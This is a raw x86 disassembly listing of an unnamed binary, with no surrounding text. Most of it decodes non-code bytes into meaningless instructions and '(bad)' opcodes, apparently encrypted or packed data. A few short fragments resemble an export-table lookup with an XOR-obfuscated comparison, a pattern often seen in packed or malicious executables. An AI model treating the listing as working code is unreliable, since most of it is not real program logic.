  414972:	gs pusha 
  414974:	xchg   esp,eax
  414975:	js     0x4149f1
  414977:	outs   dx,BYTE PTR ds:[esi]
  414978:	mov    ?,WORD PTR ss:[eax+0x58]
  41497c:	int3   
  41497d:	mov    BYTE PTR [edx+0x761fa69],0x22
  414984:	imul   esp,DWORD PTR [ecx+0x39],0xffffffa3
  414988:	xor    al,0x5f
  41498a:	add    eax,0x653de5c0
  41498f:	jl     0x4149d3
  414991:	push   es
  414992:	imul   ebp,DWORD PTR [ebx+0xe7bc1fc],0xb9d550df
  41499c:	test   BYTE PTR [ecx+0x6861c4ad],0x3a
  4149a3:	or     DWORD PTR [ebx+0x1de732d4],ebx
  4149a9:	push   0xffffffb4
  4149ab:	stos   DWORD PTR es:[edi],eax
  4149ac:	test   BYTE PTR [edi-0x4b],0x8a
  4149b0:	int3   
  4149b1:	mov    ds:0x3c62464f,al
  4149b6:	and    eax,0xe096e467
  4149bb:	xchg   ebp,edx
  4149bd:	(bad)  
  4149be:	out    0xee,eax
  4149c0:	dec    ebx
  4149c1:	adc    edi,DWORD PTR [edx-0x46]
  4149c4:	and    al,0xc
  4149c6:	and    dl,BYTE PTR [eax-0x35d661b]
  4149cc:	es add eax,0xc44de4b9
  4149d2:	xchg   DWORD PTR [ebp+0x4b176a44],edx
  4149d8:	sub    al,0xcf
  4149da:	mov    ecx,0x48404308
  4149df:	fisub  DWORD PTR [eax+0x72]
  4149e2:	xchg   ecx,eax
  4149e3:	das    
  4149e4:	popa   
  4149e5:	pop    ebx
  4149e6:	mov    edx,0x2b0eea8d
  4149eb:	sub    eax,0x5079c84b
  4149f0:	pop    ds
  4149f1:	inc    edi
  4149f2:	xchg   esi,eax
  4149f3:	and    eax,DWORD PTR [eax-0x59]
  4149f6:	or     ebx,eax
  4149f8:	jb     0x414a41
  4149fa:	aas    
  4149fb:	jne    0x414a27
  4149fd:	pop    edx
  4149fe:	push   0xfffffff3
  414a00:	pop    eax
  414a01:	das    
  414a02:	retf   
  414a03:	cmp    eax,0x71cb21e1
  414a08:	fidiv  DWORD PTR [ebp+0x7d700cba]
  414a0e:	cmp    BYTE PTR [ecx+eiz*8],0xd9
  414a12:	pop    ebx
  414a13:	add    bl,bl
  414a15:	xor    bl,bl
  414a17:	sbb    eax,0x58d6bac1
  414a1c:	jo     0x414a0d
  414a1e:	test   DWORD PTR [esi+0x3e],ebx
  414a21:	inc    ecx
  414a22:	dec    ebp
  414a23:	cmp    eax,0xb07fc8a8
  414a28:	mov    ds:0x453ed242,al
  414a2d:	mov    ds:0x8f519b7b,al
  414a32:	lock push ss
  414a34:	int    0x1e
  414a36:	xor    esi,DWORD PTR [ebp-0x2286a354]
  414a3c:	push   eax
  414a3d:	xchg   ebx,eax
  414a3f:	ss mov ah,0x74
  414a42:	scas   al,BYTE PTR es:[edi]
  414a43:	inc    edx
  414a44:	or     dl,BYTE PTR [ecx*4+0x40f1141b]
  414a4b:	sub    esp,DWORD PTR [eax+0x4a585a61]
  414a51:	jns    0x414abf
  414a53:	sub    DWORD PTR [eax-0x48],eax
  414a56:	and    cl,0x8f
  414a59:	dec    ecx
  414a5a:	je     0x414ab7
  414a5c:	inc    BYTE PTR [esp+esi*4-0x4a7b97]
  414a63:	(bad)  
  414a64:	jae    0x414a44
  414a66:	ret    0xed78
  414a69:	xlat   BYTE PTR ds:[ebx]
  414a6a:	(bad)  
  414a6b:	and    al,0xbc
  414a6d:	pop    ds
  414a6e:	fisubr DWORD PTR [edi+0x50]
  414a71:	dec    esi
  414a72:	mov    cl,0x42
  414a74:	ss mov ecx,0xfeae6b8b
  414a7a:	ins    DWORD PTR es:[edi],dx
  414a7b:	lds    edi,FWORD PTR [ebx]
  414a7d:	lods   al,BYTE PTR ds:[esi]
  414a7e:	xchg   BYTE PTR [esp+edx*8],ah
  414a81:	in     al,dx
  414a82:	jle    0x414a77
  414a84:	and    eax,0xd193929
  414a89:	inc    edi
  414a8a:	sub    eax,0x1d55a062
  414a8f:	cmp    eax,0x7a00f7dc
  414a94:	ror    ch,1
  414a96:	xlat   BYTE PTR ds:[ebx]
  414a97:	(bad)  
  414a98:	xor    eax,0x843cb1a0
  414a9d:	xlat   BYTE PTR ds:[ebx]
  414a9e:	(bad)  
  414a9f:	out    dx,eax
  414aa0:	inc    eax
  414aa1:	push   ebx
  414aa2:	xor    al,0x6a
  414aa4:	mov    ah,0xd
  414aa6:	mov    esi,?
  414aa8:	cmp    cl,bl
  414aaa:	call   DWORD PTR [eax+0x52eabbbd]
  414ab0:	jp     0x414aae
  414ab2:	ins    DWORD PTR es:[edi],dx
  414ab3:	fist   WORD PTR [esi-0x4]
  414ab6:	pop    edi
  414ab7:	ss fwait
  414ab9:	xlat   BYTE PTR ds:[ebx]
  414aba:	mov    edx,0xf41e5f30
  414abf:	nop
  414ac0:	mov    ebx,0x35005805
  414ac5:	in     eax,dx
  414ac6:	jmp    0x4474:0xbd7a8da1
  414acd:	cmp    bh,BYTE PTR [ebp-0x79]
  414ad0:	inc    esi
  414ad1:	test   DWORD PTR [ebp+0x41],esi
  414ad4:	mov    esp,0xcdc7a17b
  414ad9:	not    DWORD PTR [esi-0x12869767]
  414adf:	fistp  QWORD PTR [edx]
  414ae1:	push   0x7b
  414ae3:	mov    dl,dl
  414ae5:	hlt    
  414ae6:	fld    QWORD PTR [esi]
  414ae8:	xor    al,0x5d
  414aea:	fs int3 
  414aec:	out    0x97,al
  414aee:	and    eax,0x7df7da5b
  414af3:	inc    edx
  414af4:	push   0x1a4b3f4f
  414af9:	lea    ebx,[edx+0x6744e777]
  414aff:	mov    dl,0xf9
  414b01:	fsub   QWORD PTR [esi+0x1a]
  414b04:	mov    DWORD PTR ds:0xb201904a,eax
  414b0a:	addr16 push 0x99975756
  414b10:	push   edx
  414b11:	ins    DWORD PTR es:[edi],dx
  414b12:	ja     0x414aaf
  414b14:	or     edi,DWORD PTR [esi]
  414b16:	popa   
  414b17:	cmc    
  414b18:	mov    dh,0xd9
  414b1a:	icebp  
  414b1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b1c:	inc    esp
  414b1d:	push   ss
  414b1e:	add    eax,0x99f9990b
  414b23:	pop    ebp
  414b24:	mov    BYTE PTR [eax+eax*8+0x4f217b89],dh
  414b2b:	xchg   edx,eax
  414b2c:	icebp  
  414b2d:	mov    ebx,0xff9146bf
  414b32:	loop   0x414b37
  414b34:	ret    
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	(bad)  
  414bb7:	pop    edx
  414bb8:	popf   
  414bb9:	pop    eax
  414bba:	pop    ebx
  414bbb:	jnp    0x414c3c
  414bbd:	jo     0x414b78
  414bbf:	jle    0x414c31
  414bc1:	jo     0x414b51
  414bc3:	shl    BYTE PTR [eax+0x18393ab0],0xf3
  414bca:	pop    eax
  414bcb:	das    
  414bcc:	daa    
  414bcd:	xchg   DWORD PTR [edx-0x3],esp
  414bd0:	cmc    
  414bd1:	cli    
  414bd2:	mov    ch,0xf5
  414bd4:	mov    ?,WORD PTR [esi-0x7]
  414bd7:	mov    DWORD PTR ds:0x6bbf6e29,0xa075b5a1
  414be1:	mov    ah,0x20
  414be3:	mov    esp,0x416fa986
  414be8:	pop    eax
  414be9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bea:	xchg   ebp,eax
  414beb:	or     ch,BYTE PTR [edx+0x543b999e]
  414bf1:	retf   0x8f03
  414bf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bf5:	xchg   BYTE PTR [eax],al
  414bf7:	push   ebx
  414bf8:	jno    0x414b91
  414bfa:	mov    al,0xc4
  414bfc:	rol    BYTE PTR [esp+ecx*2-0x68f2e335],cl
  414c03:	xchg   ecx,eax
  414c04:	popa   
  414c05:	xor    BYTE PTR [ecx-0x78f1bac7],ch
  414c0b:	out    0x86,al
  414c0d:	(bad)  
  414c0e:	int3   
  414c0f:	mov    esi,0xffa01b4c
  414c14:	je     0x414c78
  414c16:	dec    ebp
  414c17:	pushf  
  414c18:	add    al,0xa7
  414c1a:	dec    esi
  414c1b:	das    
  414c1c:	stos   DWORD PTR es:[edi],eax
  414c1d:	ret    
  414c1e:	inc    ebp
  414c1f:	hlt    
  414c20:	in     eax,0x71
  414c22:	pop    es
  414c23:	dec    esi
  414c24:	shr    DWORD PTR [ecx],0x76
  414c27:	cmp    BYTE PTR [esi-0x48],bl
  414c2a:	sub    DWORD PTR fs:[eax-0x2dd5e959],edx
  414c31:	push   esp
  414c32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c33:	and    al,0xc9
  414c35:	fidiv  DWORD PTR [ebx+0x7b]
  414c38:	cmp    ecx,DWORD PTR [esi]
  414c3a:	fisttp WORD PTR [ecx-0x14e0cd7f]
  414c40:	pop    edx
  414c41:	sbb    ebp,DWORD PTR [ecx-0x5]
  414c44:	scas   al,BYTE PTR es:[edi]
  414c45:	stos   DWORD PTR es:[edi],eax
  414c46:	jle    0x414c39
  414c48:	pop    esi
  414c49:	js     0x414bcc
  414c4b:	(bad)  
  414c4c:	xchg   esi,eax
  414c4d:	je     0x414c6f
  414c4f:	lea    edi,[esi+0x6d104083]
  414c55:	sub    al,bl
  414c57:	cdq    
  414c58:	je     0x414c8a
  414c5a:	sub    ecx,DWORD PTR [ecx]
  414c5c:	mov    bh,0x39
  414c5e:	xchg   ebp,eax
  414c5f:	pop    ss
  414c60:	or     BYTE PTR [edi],dh
  414c62:	sbb    eax,0x8fa94fb2
  414c67:	adc    bl,BYTE PTR [edx+0x4b]
  414c6a:	fnstcw WORD PTR ds:[ecx-0xe]
  414c6e:	inc    ecx
  414c6f:	fcmovne st,st(3)
  414c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c73:	js     0x414c21
  414c75:	pop    eax
  414c76:	jne    0x414cbc
  414c78:	add    eax,0xc2d2e04b
  414c7d:	xchg   BYTE PTR [ecx],dl
  414c7f:	in     eax,0xcd
  414c81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c82:	adc    dh,BYTE PTR [esi+0x3d]
  414c85:	sbb    esi,DWORD PTR [edx+0x2657526e]
  414c8b:	outs   dx,BYTE PTR ds:[esi]
  414c8c:	jae    0x414c2f
  414c8e:	mov    ch,0x1c
  414c90:	in     al,dx
  414c91:	fisub  WORD PTR [ecx+0x1a]
  414c94:	sbb    eax,0xfcba18bb
  414c99:	test   ebx,edi
  414c9b:	xor    al,0x86
  414c9d:	imul   DWORD PTR [esi+ebx*1-0x66]
  414ca1:	add    BYTE PTR ds:0xe69d19b3,dl
  414ca7:	fwait
  414ca8:	data16 add al,0x5f
  414cab:	scas   al,BYTE PTR es:[edi]
  414cac:	fs sbb al,0xbd
  414caf:	ror    DWORD PTR [esi+0x3754ec5f],0xe1
  414cb6:	mov    ds:0xd7a1d64,al
  414cbb:	aad    0x1c
  414cbd:	mov    WORD PTR [ebx-0x78],cs
  414cc0:	pop    ebx
  414cc1:	into   
  414cc2:	cdq    
  414cc3:	ficomp DWORD PTR [esi+0x13b4d790]
  414cc9:	lea    ecx,[eax]
  414ccb:	addr16 jg 0x414d15
  414cce:	leave  
  414ccf:	jle    0x414ca1
  414cd1:	mov    cs,WORD PTR [eax+0xe]
  414cd4:	pop    edi
  414cd5:	enter  0xfc7e,0xbf
  414cd9:	stos   BYTE PTR es:[edi],al
  414cda:	mov    edx,0x39a25f2f
  414cdf:	(bad)  
  414ce0:	push   ebx
  414ce1:	inc    eax
  414ce2:	test   BYTE PTR [esi],0x37
  414ce5:	xchg   edi,eax
  414ce6:	scas   eax,DWORD PTR es:[edi]
  414ce7:	loope  0x414c86
  414ce9:	mov    ah,0x2c
  414ceb:	mov    bl,0x6
  414ced:	push   ebp
  414cee:	dec    esp
  414cef:	in     eax,dx
  414cf0:	sbb    ch,cl
  414cf2:	(bad)  
  414cf4:	lock ficom DWORD PTR ds:0x2aa32da6
  414cfb:	mov    edi,0x54aa3d96
  414d00:	inc    eax
  414d01:	repz (bad) 
  414d03:	xchg   ebx,eax
  414d04:	jno    0x414c92
  414d06:	pop    ss
  414d07:	sbb    eax,DWORD PTR ds:0xd6b1c2bf
  414d0d:	push   ebx
  414d0e:	push   ds
  414d0f:	push   esi
  414d10:	pop    edx
  414d11:	mov    dh,0xe6
  414d13:	pop    esi
  414d14:	or     ebp,DWORD PTR [edi-0x41]
  414d17:	fcomip st,st(3)
  414d19:	test   BYTE PTR [edx],ah
  414d1b:	sub    DWORD PTR gs:[esi],edx
  414d1e:	inc    eax
  414d1f:	mov    edi,0x96c2cef8
  414d24:	retf   
  414d25:	add    ebx,DWORD PTR [edi]
  414d27:	add    BYTE PTR [esi],0xf0
  414d2a:	loop   0x414d73
  414d2c:	jle    0x414d2e
  414d2e:	icebp  
  414d2f:	mov    al,cs:0x6c598024
  414d35:	stos   BYTE PTR es:[edi],al
  414d36:	cmp    eax,DWORD PTR [esi+0x19]
  414d39:	shl    BYTE PTR [ecx+eiz*2-0x3b],cl
  414d3d:	mov    dl,BYTE PTR [ebx]
  414d3f:	daa    
  414d40:	jle    0x414d84
  414d42:	inc    ecx
  414d43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d44:	ret    0xb0e4
  414d47:	lods   al,BYTE PTR ds:[esi]
  414d48:	or     eax,0x3ca0fc85
  414d4d:	out    dx,al
  414d4e:	mov    ds:0xd5a71041,al
  414d53:	xchg   ebp,eax
  414d54:	les    edx,FWORD PTR [edi+0x473091da]
  414d5a:	mov    ecx,0x2f7dfe59
  414d5f:	xor    BYTE PTR [ecx*4+0x6c62d60d],bh
  414d66:	(bad)
  414d69:	rep ins DWORD PTR es:[edi],dx
  414d6b:	int3   
  414d6c:	inc    esp
  414d6d:	jmp    0x414cfe
  414d6f:	jbe    0x414d9a
  414d71:	xor    al,0xc0
  414d73:	push   cs
  414d74:	mov    ebp,DWORD PTR [ecx-0x3db5f1f5]
  414d7a:	inc    ebx
  414d7b:	data16 mov ah,0x76
  414d7e:	push   edx
  414d7f:	inc    edi
  414d80:	and    bl,cl
  414d82:	ret    0x22d0
  414d85:	dec    ecx
  414d86:	adc    eax,0x7d2b580c
  414d8b:	push   ecx
  414d8c:	mov    ds:0xb28c33fe,eax
  414d91:	cs jge 0x414d3c
  414d94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d95:	ret    0xca8
  414d98:	popf   
  414d99:	cs (bad) 
  414d9c:	das    
  414d9d:	sub    al,0x83
  414d9f:	xor    al,0x98
  414da1:	mov    al,0x7c
  414da3:	out    0x90,al
  414da5:	push   ss
  414da6:	xor    al,0xf
  414da8:	inc    ecx
  414da9:	outs   dx,DWORD PTR ds:[esi]
  414daa:	adc    edx,DWORD PTR [ecx+0xe839520]
  414db0:	sbb    dl,ah
  414db2:	jo     0x414dd7
  414db4:	adc    BYTE PTR [ebp+0x28db925],0xce
  414dbb:	sti    
  414dbc:	retf   0xc4eb
  414dbf:	and    BYTE PTR [esi-0x3c],cl
  414dc2:	xchg   ebp,eax
  414dc3:	lahf   
  414dc4:	and    ah,BYTE PTR [edx+0x4b]
  414dc7:	push   ss
  414dc8:	lock xor al,0xb8
  414dcb:	xchg   esp,eax
  414dcc:	push   edx
  414dcd:	push   cs
  414dce:	xor    al,0x48
  414dd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dd1:	test   al,0x9c
  414dd3:	xor    BYTE PTR [ebx-0x2f],cl
  414dd6:	inc    esi
  414dd7:	xchg   edx,eax
  414dd8:	leave  
  414dd9:	cld    
  414dda:	mov    ah,0x7b
  414ddc:	dec    ebx
  414ddd:	pop    ds
  414dde:	inc    edi
  414ddf:	mov    eax,ds:0xd84ad6b5
  414de4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414de5:	xor    edx,DWORD PTR [ebx]
  414de7:	mov    ecx,0xfd157004
  414dec:	push   esi
  414ded:	pop    esi
  414dee:	add    edx,ebx
  414df0:	mov    bh,0x91
  414df2:	jl     0x414d9b
  414df4:	pop    ss
  414df5:	pushf  
  414df6:	mov    al,0x1c
  414df8:	(bad)  
  414df9:	fxch   st(4)
  414dfb:	xchg   BYTE PTR [edx],bl
  414dfd:	or     eax,0x1ea393c7
  414e02:	xchg   edi,eax
  414e03:	ja     0x414df0
  414e05:	inc    ebx
  414e06:	adc    eax,0xa3c7bbbb
  414e0b:	push   es
  414e0c:	xor    eax,0x4834ff3e
  414e11:	(bad)  
  414e13:	jns    0x414d98
  414e15:	xchg   edx,eax
  414e16:	gs pop esi
  414e18:	aas    
  414e19:	and    BYTE PTR [edx-0x27],0x5f
  414e1d:	push   ebp
  414e1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e1f:	pop    esp
  414e20:	fldcw  WORD PTR [edx-0x267893f5]
  414e26:	sbb    BYTE PTR [eax+ebx*8-0x53c79949],ah
  414e2d:	xchg   edi,eax
  414e2e:	xlat   BYTE PTR ds:[ebx]
  414e2f:	fs sub al,0x30
  414e32:	mov    ch,BYTE PTR ds:0x1ef5e0f3
  414e38:	cs jg  0x414e0b
  414e3b:	mov    eax,ds:0x29e7609
  414e40:	retf   
  414e41:	dec    edi
  414e42:	xor    eax,DWORD PTR [ecx+0x67620163]
  414e48:	push   ss
  414e49:	sar    BYTE PTR [edi-0x2c89ecfb],1
  414e4f:	(bad)
  414e54:	out    dx,eax
  414e55:	test   eax,0x78f103c2
  414e5a:	sub    bl,ch
  414e5c:	mov    esi,0xb1b3efed
  414e61:	inc    edi
  414e62:	push   0x5d
  414e64:	dec    edi
  414e65:	stos   DWORD PTR es:[edi],eax
  414e66:	mov    bh,0x38
  414e68:	dec    ecx
  414e69:	shl    DWORD PTR [edi+0xd],1
  414e6c:	call   0x9676:0x874ade55
  414e73:	push   ebx
  414e74:	cmp    eax,0x30c78131
  414e79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e7a:	(bad)  
  414e7b:	ficom  WORD PTR [edi]
  414e7d:	xchg   esp,eax
  414e7e:	call   0x4528c5ee
  414e83:	rcr    DWORD PTR [esi],1
  414e85:	popa   
  414e86:	xor    BYTE PTR [esi],0x4c
  414e89:	pop    ecx
  414e8a:	push   0x5
  414e8c:	dec    ecx
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	cmp    BYTE PTR [edi+eiz*8],0xe8
  414eb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eb1:	js     0x414f32
  414eb3:	jo     0x414e6e
  414eb5:	jle    0x414f27
  414eb7:	jo     0x414eb7
  414eb9:	call   0xf641b7dd
  414ebe:	fnsave cs:[ebx-0x1]
  414ec2:	pop    es
  414ec3:	std    
  414ec4:	fidivr DWORD PTR gs:[ecx+0x6e]
  414ec8:	inc    esp
  414ec9:	ret    0x3ce2
  414ecc:	cmc    
  414ecd:	dec    ecx
  414ece:	mov    edi,0x2ca1df6a
  414ed3:	mov    al,ds:0xe8a96056
  414ed8:	mov    bh,0x7a
  414eda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414edb:	cmp    al,0xd4
  414edd:	cmp    eax,0x1bb0bb66
  414ee2:	mov    ebx,0x5b067b40
  414ee7:	jo     0x414ea4
  414ee9:	call   0x71c398
  414eee:	sub    eax,0xe80d76b
  414ef3:	mov    ds:0xc83fae8d,al
  414ef8:	push   cs
  414ef9:	dec    ebx
  414efa:	rol    DWORD PTR [eax-0x4ef98742],1
  414f00:	fs jns 0x414ef6
  414f03:	mov    al,0x7f
  414f05:	repnz sar ecx,0x60
  414f09:	fldenv [edi]
  414f0b:	xor    al,dh
  414f0d:	cmc    
  414f0e:	sbb    bh,ch
  414f10:	scas   al,BYTE PTR es:[edi]
  414f11:	test   ah,0xc2
  414f14:	out    0xac,al
  414f16:	stc    
  414f17:	mov    bh,0x9d
  414f19:	retf   0xbfb7
  414f1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f1d:	jl     0x414f74
  414f1f:	daa    
  414f20:	fwait
  414f21:	push   ss
  414f22:	dec    eax
  414f23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f24:	imul   esi,DWORD PTR [esi+0x45246568],0x35
  414f2b:	dec    esi
  414f2c:	pop    ecx
  414f2d:	inc    esp
  414f2e:	stos   BYTE PTR es:[edi],al
  414f2f:	or     dl,BYTE PTR [edi+0x42]
  414f32:	add    BYTE PTR [ebx-0x65f4e4d4],bh
  414f38:	mov    eax,eax
  414f3a:	sbb    BYTE PTR [ebx+eax*1],bl
  414f3d:	xchg   ebx,eax
  414f3e:	cmp    esp,DWORD PTR ds:0x634c3740
  414f44:	lock jge 0x414ed6
  414f47:	jmp    0x87fc25c6
  414f4c:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  414f4e:	inc    ebp
  414f4f:	aad    0x7
  414f51:	xchg   DWORD PTR [edi-0x50b59bbc],ecx
  414f57:	cmc    
  414f58:	push   esi
  414f59:	outs   dx,BYTE PTR ds:[esi]
  414f5a:	inc    ecx
  414f5b:	mov    ebp,0xbea555df
  414f60:	(bad)  
  414f62:	push   ebx
  414f63:	(bad)  
  414f65:	aaa    
  414f66:	adc    cl,dh
  414f68:	add    al,BYTE PTR [edx+0xc]
  414f6b:	mov    edi,0x15c8c869
  414f70:	jae    0x414fed
  414f72:	cmc    
  414f73:	and    ebp,ebx
  414f75:	fmul   DWORD PTR [ecx+0x44db9a8d]
  414f7b:	int    0xf
  414f7d:	push   ss
  414f7e:	pop    es
  414f7f:	xor    ecx,DWORD PTR [ebp-0xa660ca5]
  414f85:	(bad)  
  414f86:	sub    eax,0x1675885d
  414f8b:	repz pushf 
  414f8d:	mov    ah,0xb0
  414f8f:	pop    ecx
  414f90:	push   cs
  414f91:	in     al,dx
  414f92:	push   0xe05867d9
  414f97:	fcmovu st,st(0)
  414f99:	(bad)  
  414f9b:	and    edi,DWORD PTR [ecx]
  414f9d:	and    ebp,edi
  414f9f:	ret    
  414fa0:	cmc    
  414fa1:	les    edi,FWORD PTR [ecx+0x18824e99]
  414fa7:	jecxz  0x414fc1
  414fa9:	sub    BYTE PTR [ecx-0x7d39cf86],dh
  414faf:	mov    bh,0x87
  414fb1:	ss (bad) 
  414fb3:	sti    
  414fb4:	aaa    
  414fb5:	cdq    
  414fb6:	les    edi,FWORD PTR [eax+eax*8]
  414fb9:	mov    eax,0x4ac60dfe
  414fbe:	jb     0x414fe7
  414fc0:	icebp  
  414fc1:	sub    al,0x8d
  414fc3:	dec    ecx
  414fc4:	es aas 
  414fc6:	cwde   
  414fc7:	pop    ss
  414fc8:	or     DWORD PTR gs:[edx-0x77],ebx
  414fcc:	iret   
  414fcd:	loope  0x414f7a
  414fcf:	lahf   
  414fd0:	dec    BYTE PTR [esi]
  414fd2:	mov    dl,0x6c
  414fd4:	inc    esi
  414fd5:	ins    DWORD PTR es:[edi],dx
  414fd6:	mov    ds:0xa2bc39a1,al
  414fdb:	jae    0x414f63
  414fdd:	stc    
  414fde:	iret   
  414fdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fe0:	xchg   ecx,eax
  414fe1:	pop    esi
  414fe2:	ret    0x9fdb
  414fe5:	aaa    
  414fe6:	sbb    DWORD PTR [ecx+eax*2+0x7ccebec1],esp
  414fed:	imul   edi,DWORD PTR ds:0xeffd0359,0xfffffff0
  414ff4:	push   0x716af724
  414ff9:	sbb    BYTE PTR [edi-0x7fc790fe],dl
  414fff:	push   esi
  415000:	mov    ecx,0xef7b6d40
  415005:	test   eax,0xa453a51d
  41500a:	push   edi
  41500b:	ss mov dl,0x20
  41500e:	pop    edx
  41500f:	cmp    ch,BYTE PTR [edx-0xd823012]
  415015:	lock and bh,al
  415018:	fldenv ds:0xe3bbf1b9
  41501e:	sub    eax,0xdcca1caf
  415023:	xchg   edx,ebx
  415025:	pusha  
  415026:	jl     0x414fbc
  415028:	mov    ebp,0xb07a6b3c
  41502d:	outs   dx,DWORD PTR ds:[esi]
  41502e:	shl    BYTE PTR [edx],cl
  415030:	lods   eax,DWORD PTR ds:[esi]
  415031:	aam    0xa
  415033:	jmp    0x415022
  415035:	xor    esi,DWORD PTR [ebx]
  415037:	les    ebp,FWORD PTR [ebp+0x78c39782]
  41503d:	mov    edx,0x4e047ea7
  415042:	sbb    eax,ebx
  415044:	add    al,0xb9
  415046:	pusha  
  415047:	jmp    0x415050
  415049:	es mov ch,0x19
  41504c:	xchg   ebx,eax
  41504d:	fdivr  QWORD PTR [ebx-0x48]
  415050:	and    esp,esp
  415052:	addr16 es jl 0x4150bd
  415056:	push   eax
  415057:	mov    ds:0x24cca524,al
  41505c:	xchg   edx,eax
  41505d:	div    DWORD PTR [ebp+0x54d75104]
  415063:	ret    0xb649
  415066:	push   ebp
  415067:	mov    esp,0x152e9d6f
  41506c:	mov    cl,0x7f
  41506e:	jae    0x415069
  415070:	pop    ebx
  415071:	push   ebx
  415072:	xor    eax,0x22f4683e
  415077:	aam    0x22
  415079:	inc    edx
  41507a:	aas    
  41507b:	ss (bad) 
  41507e:	mov    cl,0x10
  415080:	add    edi,DWORD PTR [edi+0x16]
  415083:	inc    ebp
  415084:	(bad)  
  415085:	jno    0x41508b
  415087:	jne    0x41505f
  415089:	mov    esi,0xd2e2d725
  41508e:	shl    DWORD PTR gs:[esi+ebx*1+0x3a85ffb4],cl
  415096:	call   0x673b2bea
  41509b:	fnstsw WORD PTR [esi+0x13f0b29c]
  4150a1:	push   ss
  4150a2:	add    edx,eax
  4150a4:	enter  0x1a26,0xc3
  4150a8:	cli    
  4150a9:	jno    0x415074
  4150ab:	xchg   esp,eax
  4150ac:	(bad)  [edi+0x3a7b22bd]
  4150b2:	(bad)  
  4150b3:	sbb    DWORD PTR [eax+0x3db3cc8a],esp
  4150b9:	popf   
  4150ba:	ja     0x4150de
  4150bc:	or     bh,BYTE PTR [edx-0x6c]
  4150bf:	ins    BYTE PTR es:[edi],dx
  4150c0:	xchg   ecx,eax
  4150c1:	not    DWORD PTR [edi+0x7c]
  4150c4:	es into 
  4150c6:	jne    0x4150da
  4150c8:	or     BYTE PTR [eax-0x22],bh
  4150cb:	out    0x10,al
  4150cd:	std    
  4150ce:	addr16 ret 
  4150d0:	or     DWORD PTR es:[ebx+0x16],ecx
  4150d4:	mov    bh,bh
  4150d6:	or     BYTE PTR [esi],0xf8
  4150d9:	xlat   BYTE PTR ds:[ebx]
  4150da:	cmp    cl,ch
  4150dc:	inc    ebp
  4150dd:	xor    BYTE PTR [ebx-0x36464ba8],bl
  4150e3:	cmp    dh,BYTE PTR ds:0xb373d3dc
  4150ea:	add    eax,0xb38e8beb
  4150ef:	aaa    
  4150f0:	xchg   edi,eax
  4150f1:	jns    0x415157
  4150f3:	add    ch,bl
  4150f5:	push   cs
  4150f6:	adc    ch,ch
  4150f8:	push   ebx
  4150f9:	test   DWORD PTR [edx],esi
  4150fb:	mov    ss,WORD PTR [ecx]
  4150fd:	mov    dl,0x6e
  4150ff:	pop    ebp
  415100:	push   0xffffff82
  415102:	(bad)  
  415103:	out    0x48,al
  415105:	add    al,0xf6
  415107:	outs   dx,BYTE PTR ds:[esi]
  415108:	or     eax,0x26b647a4
  41510d:	xlat   BYTE PTR ds:[ebx]
  41510e:	jb     0x415130
  415110:	stc    
  415111:	push   0x309afcf
  415116:	jp     0x4150c3
  415118:	and    ah,dl
  41511a:	test   ah,dh
  41511c:	repnz xchg esi,eax
  41511e:	and    esp,DWORD PTR [ebx+0x55661f2e]
  415124:	aas    
  415125:	pop    ds
